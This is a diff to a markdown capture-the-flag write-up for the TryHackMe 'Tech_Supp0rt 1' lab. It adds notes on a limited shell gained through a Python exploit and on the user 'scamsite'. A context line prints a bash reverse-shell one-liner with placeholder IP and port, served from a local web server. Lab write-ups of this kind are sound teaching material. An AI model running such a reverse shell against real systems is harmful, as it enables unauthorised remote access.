@@ -101,6 +101,13 @@ As we already know the username and the password, using this script will be no b
 
 ![python exploit](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Tech_Supp0rt%201/tech_supp0rt%201%20images/python%20exploit.png)
 
+With whoami we see that we have user permissions, and an inconvenient shell. We can't really cd or use useful commands as we have no standard output.\
+At least we can see what lies in the home directory and what users we have to deal with.
+
+**scamsite** Is our guy.
+![usr_scamsite](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Tech_Supp0rt%201/tech_supp0rt%201%20images/user_scamsite.png)
+
+
 Ideally we should have a better shell, as this one doesn't operate that great. I used a bash reverse shell for that, while hosting the shell code `bash -i >& /dev/tcp/IP/PORT 0>&1` on a local python webserver.\
 
 
